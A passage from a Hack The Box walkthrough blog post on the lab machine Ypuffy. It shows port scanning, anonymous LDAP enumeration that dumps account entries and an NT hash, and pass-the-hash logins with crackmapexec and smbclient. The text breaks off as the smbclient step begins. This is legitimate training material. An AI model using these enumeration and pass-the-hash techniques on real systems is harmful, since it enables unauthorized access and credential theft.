<!DOCTYPE html><html lang="en" mode="dark" > <!-- The Head v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><title>Ypuffy | TheCaretaker</title><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Ypuffy" /><meta name="author" content="Deepak Dhasmana" /><meta property="og:locale" content="en_US" /><meta name="description" content="Ypuffy is medium difficulty machine which highlights the danger of allowing LDAP null sessions. It also features an interesting SSH CA authentication privilege escalation, via the OpenBSD doas command. An additional privilege escalation involving Xorg is also possible." /><meta property="og:description" content="Ypuffy is medium difficulty machine which highlights the danger of allowing LDAP null sessions. It also features an interesting SSH CA authentication privilege escalation, via the OpenBSD doas command. An additional privilege escalation involving Xorg is also possible." /><link rel="canonical" href="https://0xcaretaker.github.io/posts/Ypuffy/" /><meta property="og:url" content="https://0xcaretaker.github.io/posts/Ypuffy/" /><meta property="og:site_name" content="TheCaretaker" /><meta property="og:image" content="https://0xcaretaker.github.io/assets/img/Posts/Ypuffy/Ypuffy.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-08-21T14:40:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://0xcaretaker.github.io/assets/img/Posts/Ypuffy/Ypuffy.png" /><meta property="twitter:title" content="Ypuffy" /><meta name="twitter:site" content="@0xCaretaker" /><meta name="twitter:creator" content="@Deepak Dhasmana" /><meta name="google-site-verification" content="qxu37CH4WxgxVlq54JzTLwQ-GdVvbJNhJsDxYZsYA48" /> <script type="application/ld+json"> {"headline":"Ypuffy","dateModified":"2021-08-21T14:40:00+05:30","datePublished":"2021-08-21T14:40:00+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xcaretaker.github.io/posts/Ypuffy/"},"image":"https://0xcaretaker.github.io/assets/img/Posts/Ypuffy/Ypuffy.png","author":{"@type":"Person","name":"Deepak Dhasmana"},"@type":"BlogPosting","description":"Ypuffy is medium difficulty machine which highlights the danger of allowing LDAP null sessions. It also features an interesting SSH CA authentication privilege escalation, via the OpenBSD doas command. An additional privilege escalation involving Xorg is also possible.","url":"https://0xcaretaker.github.io/posts/Ypuffy/","@context":"https://schema.org"}</script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="google-site-verification" content="qxu37CH4WxgxVlq54JzTLwQ-GdVvbJNhJsDxYZsYA48" /><title>Ypuffy | TheCaretaker</title><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Ypuffy" /><meta name="author" content="Deepak Dhasmana" /><meta property="og:locale" content="en_US" /><meta name="description" content="Ypuffy is medium difficulty machine which highlights the danger of allowing LDAP null sessions. It also features an interesting SSH CA authentication privilege escalation, via the OpenBSD doas command. An additional privilege escalation involving Xorg is also possible." /><meta property="og:description" content="Ypuffy is medium difficulty machine which highlights the danger of allowing LDAP null sessions. It also features an interesting SSH CA authentication privilege escalation, via the OpenBSD doas command. An additional privilege escalation involving Xorg is also possible." /><link rel="canonical" href="https://0xcaretaker.github.io/posts/Ypuffy/" /><meta property="og:url" content="https://0xcaretaker.github.io/posts/Ypuffy/" /><meta property="og:site_name" content="TheCaretaker" /><meta property="og:image" content="https://0xcaretaker.github.io/assets/img/Posts/Ypuffy/Ypuffy.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-08-21T14:40:00+05:30" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://0xcaretaker.github.io/assets/img/Posts/Ypuffy/Ypuffy.png" /><meta property="twitter:title" content="Ypuffy" /><meta name="twitter:site" content="@0xCaretaker" /><meta name="twitter:creator" content="@Deepak Dhasmana" /><meta name="google-site-verification" content="qxu37CH4WxgxVlq54JzTLwQ-GdVvbJNhJsDxYZsYA48" /> <script type="application/ld+json"> {"headline":"Ypuffy","dateModified":"2021-08-21T14:40:00+05:30","datePublished":"2021-08-21T14:40:00+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"https://0xcaretaker.github.io/posts/Ypuffy/"},"image":"https://0xcaretaker.github.io/assets/img/Posts/Ypuffy/Ypuffy.png","author":{"@type":"Person","name":"Deepak Dhasmana"},"@type":"BlogPosting","description":"Ypuffy is medium difficulty machine which highlights the danger of allowing LDAP null sessions. It also features an interesting SSH CA authentication privilege escalation, via the OpenBSD doas command. An additional privilege escalation involving Xorg is also possible.","url":"https://0xcaretaker.github.io/posts/Ypuffy/","@context":"https://schema.org"}</script> <!-- The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps Generated by: https://www.favicon-generator.org/ v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT license --><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="preload" as="style" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"> <!-- CSS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /><link rel="preload" as="script" href="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"> <script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1" integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" crossorigin="anonymous"></script> <script src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" async></script> <!-- JS selector for site. Chirpy v2.3 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT Licensed --> <script src="/assets/js/post.min.js" async></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"> <!-- The Side Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/profile.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">TheCaretaker</a></div><div class="site-subtitle font-italic">Penetration Tester | Ethical Hacker | CTF Player</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-home"></i> HOME</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-stream"></i> CATEGORIES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-tags"></i> TAGS</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-archive"></i> ARCHIVES</span> </a></li><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <span><i class="fas fa-id-card"></i> ABOUT</span> </a></li></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://github.com/0xCaretaker" target="_blank"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/0xCaretaker" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:window.open('mailto:' + ['deepakdhasmana0007','gmail.com'].join('@'))" > <i class="fas fa-envelope"></i> </a> <a href="https://www.hackthebox.eu/profile/371479" target="_blank"> <i class="fas fa-cube"></i> </a> <a href="https://www.linkedin.com/in/deepak-dhasmana/" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><!-- The Top Bar v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Ypuffy</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"> <!-- Refactor the HTML structure. --> <!-- Suroundding the markdown table with '<div class="table-wrapper">. and '</div>' --> <!-- Fixed kramdown code highlight rendering: https://github.com/penibelst/jekyll-compress-html/issues/101 https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901 --><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Ypuffy</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sat, Aug 21, 2021, 2:40 PM +0530" > Aug 21, 2021 <i class="unloaded">2021-08-21T14:40:00+05:30</i> </span> by <span class="author"> Deepak Dhasmana </span></div><div> Updated <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Aug 21, 2021, 2:40 PM +0530" > Aug 21, 2021 <i class="unloaded">2021-08-21T14:40:00+05:30</i> </span></div></div><div class="post-content"> <img src="/assets/img/Posts/Ypuffy/Ypuffy.png" class="post-preview-img"><p><strong>Ypuffy</strong> is medium difficulty machine which highlights the danger of allowing <strong>LDAP null sessions</strong>. It also features an interesting <strong>SSH CA authentication</strong> privilege escalation, via the <strong>OpenBSD doas</strong> command. An additional privilege escalation involving <strong>Xorg</strong> is also possible.</p><h2 id="masscan--nmap">Masscan + Nmap</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nv">$ </span>masscan <span class="nt">-p1-65535</span>,U:1-65535 <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">--rate</span><span class="o">=</span>5000 <span class="nt">-e</span> tun0 | <span class="nb">tee </span>masscan.out
Scanning 1 hosts <span class="o">[</span>131070 ports/host]
Discovered open port 139/tcp on 10.10.10.107
Discovered open port 80/tcp on 10.10.10.107
Discovered open port 22/tcp on 10.10.10.107
Discovered open port 389/tcp on 10.10.10.107
Discovered open port 445/tcp on 10.10.10.107
</pre></table></code></div></div><p>Parse those ports to nmap:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="nv">$ ports</span><span class="o">=</span><span class="si">$(</span><span class="nb">cat </span>masscan.out |awk <span class="s1">'{ print $4 }'</span> | <span class="nb">sed</span> <span class="s1">'s/\/tcp//;s/\/udp//'</span> | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed</span> <span class="s1">'s/,$//'</span><span class="si">)</span>
<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-sVC</span> <span class="nt">--min-rate</span> 1000 <span class="nt">-p</span> <span class="nv">$ports</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-oN</span> nmap-fullscan.out
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.7 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   2048 2e:19:e6:af:1b:a7:b0:e8:07:2a:2b:11:5d:7b:c6:04 <span class="o">(</span>RSA<span class="o">)</span>
|   256 <span class="nb">dd</span>:0f:6a:2a:53:ee:19:50:d9:e5:e7:81:04:8d:91:b6 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 21:9e:db:bd:e1:78:4d:72:b0:ea:b4:97:fb:7f:af:91 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http        OpenBSD httpd
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: YPUFFY<span class="o">)</span>
389/tcp open  ldap        <span class="o">(</span>Anonymous <span class="nb">bind </span>OK<span class="o">)</span>
445/tcp open  netbios-ssn Samba smbd 4.7.6 <span class="o">(</span>workgroup: YPUFFY<span class="o">)</span>
Service Info: Host: YPUFFY

Host script results:
|_clock-skew: mean: 1h20m00s, deviation: 2h18m34s, median: 0s
| smb-os-discovery:
|   OS: Windows 6.1 <span class="o">(</span>Samba 4.7.6<span class="o">)</span>
|   Computer name: ypuffy
|   NetBIOS computer name: YPUFFY<span class="se">\x</span>00
|   Domain name: hackthebox.htb
|   FQDN: ypuffy.hackthebox.htb
|_  System <span class="nb">time</span>: 2021-08-18T12:06:02-04:00
| smb-security-mode:
|   account_used: &lt;blank&gt;
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   <span class="nb">date</span>: 2021-08-18T16:06:03
|_  start_date: N/A
</pre></table></code></div></div><p>Added <code class="language-plaintext highlighter-rouge">hackthebox.htb</code>, <code class="language-plaintext highlighter-rouge">ypuffy.hackthebox.htb</code> as hosts.</p><h2 id="http">HTTP</h2><p>Not accessible, even though nmap says it’s open.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>root@TheCaretaker:~/HTB/Ypuffy# curl http://ypuffy.hackthebox.htb
curl: <span class="o">(</span>52<span class="o">)</span> Empty reply from server
root@TheCaretaker:~/HTB/Ypuffy# nc ypuffy.hackthebox.htb 80 <span class="nt">-v</span>
ypuffy.hackthebox.htb <span class="o">[</span>10.10.10.107] 80 <span class="o">(</span>http<span class="o">)</span> open
GET /
<span class="nb">help</span>
.HELP
?
</pre></table></code></div></div><p>Responds with nothing.</p><p>But if I wait for something like 5 mins:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="nv">$ </span>nc ypuffy.hackthebox.htb 80 <span class="nt">-v</span>
ypuffy.hackthebox.htb <span class="o">[</span>10.10.10.107] 80 <span class="o">(</span>http<span class="o">)</span> open
GET /
HTTP/1.0 408 Request Timeout
Date: Wed, 18 Aug 2021 16:18:53 GMT
Server: OpenBSD httpd
Connection: close
Content-Type: text/html
Content-Length: 439

&lt;<span class="o">!</span>DOCTYPE html&gt;
&lt;html&gt;
&lt;<span class="nb">head</span><span class="o">&gt;</span>
&lt;meta http-equiv<span class="o">=</span><span class="s2">"Content-Type"</span> <span class="nv">content</span><span class="o">=</span><span class="s2">"text/html; charset=utf-8"</span>/&gt;
&lt;title&gt;408 Request Timeout&lt;/title&gt;
&lt;style <span class="nb">type</span><span class="o">=</span><span class="s2">"text/css"</span><span class="o">&gt;</span>&lt;<span class="o">!</span><span class="nt">--</span>
body <span class="o">{</span> background-color: white<span class="p">;</span> color: black<span class="p">;</span> font-family: <span class="s1">'Comic Sans MS'</span>, <span class="s1">'Chalkboard SE'</span>, <span class="s1">'Comic Neue'</span>, sans-serif<span class="p">;</span> <span class="o">}</span>
hr <span class="o">{</span> border: 0<span class="p">;</span> border-bottom: 1px dashed<span class="p">;</span> <span class="o">}</span>

<span class="nt">--</span><span class="o">&gt;</span>&lt;/style&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;408 Request Timeout&lt;/h1&gt;
&lt;hr&gt;
&lt;address&gt;OpenBSD httpd&lt;/address&gt;
&lt;/body&gt;
&lt;/html&gt;
</pre></table></code></div></div><p>Shows the server - <code class="language-plaintext highlighter-rouge">OpenBSD httpd</code>, same thing which <code class="language-plaintext highlighter-rouge">nmap</code> did.</p><h2 id="ldap">LDAP</h2><p>Either I can run <code class="language-plaintext highlighter-rouge">nmap</code> with ldap scripts like: <code class="language-plaintext highlighter-rouge">nmap -p 389 --script *ldap* 10.10.10.107</code><br /> or <code class="language-plaintext highlighter-rouge">ldapsearch</code> with the domain as <code class="language-plaintext highlighter-rouge">hackthebox.htb</code> which I got from nmap results.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-b</span> <span class="s2">"DC=hackthebox,DC=htb"</span>
<span class="c"># extended LDIF</span>
<span class="c">#</span>
<span class="c"># LDAPv3</span>
<span class="c"># base &lt;DC=hackthebox,DC=htb&gt; with scope subtree</span>
<span class="c"># filter: (objectclass=*)</span>
<span class="c"># requesting: ALL</span>
<span class="c">#</span>

<span class="c"># hackthebox.htb</span>
dn: <span class="nv">dc</span><span class="o">=</span>hackthebox,dc<span class="o">=</span>htb
dc: hackthebox
objectClass: top
objectClass: domain

<span class="c"># passwd, hackthebox.htb</span>
dn: <span class="nv">ou</span><span class="o">=</span>passwd,dc<span class="o">=</span>hackthebox,dc<span class="o">=</span>htb
ou: passwd
objectClass: top
objectClass: organizationalUnit

<span class="c"># bob8791, passwd, hackthebox.htb</span>
dn: <span class="nv">uid</span><span class="o">=</span>bob8791,ou<span class="o">=</span>passwd,dc<span class="o">=</span>hackthebox,dc<span class="o">=</span>htb
uid: bob8791
cn: Bob
objectClass: account
objectClass: posixAccount
objectClass: top
userPassword:: <span class="nv">e0JTREFVVEh9Ym9iODc5MQ</span><span class="o">==</span>
uidNumber: 5001
gidNumber: 5001
gecos: Bob
homeDirectory: /home/bob8791
loginShell: /bin/ksh

<span class="c"># alice1978, passwd, hackthebox.htb</span>
dn: <span class="nv">uid</span><span class="o">=</span>alice1978,ou<span class="o">=</span>passwd,dc<span class="o">=</span>hackthebox,dc<span class="o">=</span>htb
uid: alice1978
cn: Alice
objectClass: account
objectClass: posixAccount
objectClass: top
objectClass: sambaSamAccount
userPassword:: e0JTREFVVEh9YWxpY2UxOTc4
uidNumber: 5000
gidNumber: 5000
gecos: Alice
homeDirectory: /home/alice1978
loginShell: /bin/ksh
sambaSID: S-1-5-21-3933741069-3307154301-3557023464-1001
displayName: Alice
sambaAcctFlags: <span class="o">[</span>U          <span class="o">]</span>
sambaPasswordHistory: 00000000000000000000000000000000000000000000000000000000
sambaNTPassword: 0B186E661BBDBDCF6047784DE8B9FD8B
sambaPwdLastSet: 1532916644

<span class="c"># group, hackthebox.htb</span>
dn: <span class="nv">ou</span><span class="o">=</span>group,dc<span class="o">=</span>hackthebox,dc<span class="o">=</span>htb
ou: group
objectClass: top
objectClass: organizationalUnit

<span class="c"># bob8791, group, hackthebox.htb</span>
dn: <span class="nv">cn</span><span class="o">=</span>bob8791,ou<span class="o">=</span>group,dc<span class="o">=</span>hackthebox,dc<span class="o">=</span>htb
objectClass: posixGroup
objectClass: top
cn: bob8791
userPassword:: <span class="nv">e2NyeXB0fSo</span><span class="o">=</span>
gidNumber: 5001

<span class="c"># alice1978, group, hackthebox.htb</span>
dn: <span class="nv">cn</span><span class="o">=</span>alice1978,ou<span class="o">=</span>group,dc<span class="o">=</span>hackthebox,dc<span class="o">=</span>htb
objectClass: posixGroup
objectClass: top
cn: alice1978
userPassword:: <span class="nv">e2NyeXB0fSo</span><span class="o">=</span>
gidNumber: 5000

<span class="c"># ypuffy, hackthebox.htb</span>
dn: <span class="nv">sambadomainname</span><span class="o">=</span>ypuffy,dc<span class="o">=</span>hackthebox,dc<span class="o">=</span>htb
sambaDomainName: YPUFFY
sambaSID: S-1-5-21-3933741069-3307154301-3557023464
sambaAlgorithmicRidBase: 1000
objectclass: sambaDomain
sambaNextUserRid: 1000
sambaMinPwdLength: 5
sambaPwdHistoryLength: 0
sambaLogonToChgPwd: 0
sambaMaxPwdAge: <span class="nt">-1</span>
sambaMinPwdAge: 0
sambaLockoutDuration: 30
sambaLockoutObservationWindow: 30
sambaLockoutThreshold: 0
sambaForceLogoff: <span class="nt">-1</span>
sambaRefuseMachinePwdChange: 0
sambaNextRid: 1001

<span class="c"># search result</span>
search: 2
result: 0 Success

<span class="c"># numResponses: 9</span>
<span class="c"># numEntries: 8</span>
</pre></table></code></div></div><p>I see a lot of users and passwords, also a NThash of <code class="language-plaintext highlighter-rouge">alice1978</code> which is <code class="language-plaintext highlighter-rouge">0B186E661BBDBDCF6047784DE8B9FD8B</code>.</p><p>Let’s take out all the passwords:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
</pre><td class="rouge-code"><pre><span class="nv">$ </span>ldapsearch <span class="nt">-x</span> <span class="nt">-h</span> <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-D</span> <span class="s1">''</span> <span class="nt">-w</span> <span class="s1">''</span> <span class="nt">-b</span> <span class="s2">"DC=hackthebox,DC=htb"</span> | <span class="nb">grep</span> <span class="nt">-i</span> <span class="nt">-A2</span> <span class="nt">-B2</span> <span class="s2">"userpas"</span>
objectClass: posixAccount
objectClass: top
userPassword:: <span class="nv">e0JTREFVVEh9Ym9iODc5MQ</span><span class="o">==</span>
uidNumber: 5001
gidNumber: 5001
<span class="nt">--</span>
objectClass: top
objectClass: sambaSamAccount
userPassword:: e0JTREFVVEh9YWxpY2UxOTc4
uidNumber: 5000
gidNumber: 5000
<span class="nt">--</span>
objectClass: top
cn: bob8791
userPassword:: <span class="nv">e2NyeXB0fSo</span><span class="o">=</span>
gidNumber: 5001

<span class="nt">--</span>
objectClass: top
cn: alice1978
userPassword:: <span class="nv">e2NyeXB0fSo</span><span class="o">=</span>
gidNumber: 5000
</pre></table></code></div></div><p>These passwords seem to be base64 encoded. When I decode them, they just come like in the format: <code class="language-plaintext highlighter-rouge">{BSDAUTH}username</code> eg. <code class="language-plaintext highlighter-rouge">{BSDAUTH}alice1978</code>. That isn’t userful to me.</p><h2 id="pass-the-hash-with-smb">Pass-the-hash with SMB</h2><p>Checking for <code class="language-plaintext highlighter-rouge">anonymous</code> login:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>smbclient <span class="nt">-L</span> ypuffy.hackthebox.htb <span class="nt">-U</span> anonymous
WARNING: no network interfaces found
Enter WORKGROUP<span class="se">\a</span>nonymous<span class="s1">'s password:
session setup failed: NT_STATUS_LOGON_FAILURE
</span></pre></table></code></div></div><p>Checking for any user named “anonymous” (being on the safer side; from trolls)</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nv">$ </span>smbclient <span class="nt">-L</span> ypuffy.hackthebox.htb <span class="nt">-U</span> anonymous
WARNING: no network interfaces found
Enter WORKGROUP<span class="se">\a</span>nonymous<span class="s1">'s password:
session setup failed: NT_STATUS_LOGON_FAILURE
</span></pre></table></code></div></div><p>I can try with <code class="language-plaintext highlighter-rouge">crackmapexec</code> for <code class="language-plaintext highlighter-rouge">ldap</code> with the NThash:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span>crackmapexec ldap <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-u</span> alice1978 <span class="nt">-H</span> 0B186E661BBDBDCF6047784DE8B9FD8B
LDAP        10.10.10.107    389    YPUFFY           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 <span class="o">(</span>name:YPUFFY<span class="o">)</span> <span class="o">(</span>domain:hackthebox.htb<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
  File <span class="s2">"/usr/bin/crackmapexec"</span>, line 33, <span class="k">in</span> &lt;module&gt;
    sys.exit<span class="o">(</span>load_entry_point<span class="o">(</span><span class="s1">'crackmapexec==5.1.4.dev0'</span>, <span class="s1">'console_scripts'</span>, <span class="s1">'crackmapexec'</span><span class="o">)())</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">crackmapexec</code> for <code class="language-plaintext highlighter-rouge">smb</code> gives as valid:</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span>crackmapexec smb <span class="sb">`</span>IP<span class="sb">`</span> <span class="nt">-u</span> alice1978 <span class="nt">-H</span> 0B186E661BBDBDCF6047784DE8B9FD8B
SMB         10.10.10.107    445    YPUFFY           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 6.1 <span class="o">(</span>name:YPUFFY<span class="o">)</span> <span class="o">(</span>domain:hackthebox.htb<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
SMB         10.10.10.107    445    YPUFFY           <span class="o">[</span>+] hackthebox.htb<span class="se">\a</span>lice1978 0B186E661BBDBDCF6047784DE8B9FD8B
</pre></table></code></div></div><p>So, <code class="language-plaintext highlighter-rouge">smbclient</code> does support pass-the-hash method. I’ll try for user alice.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
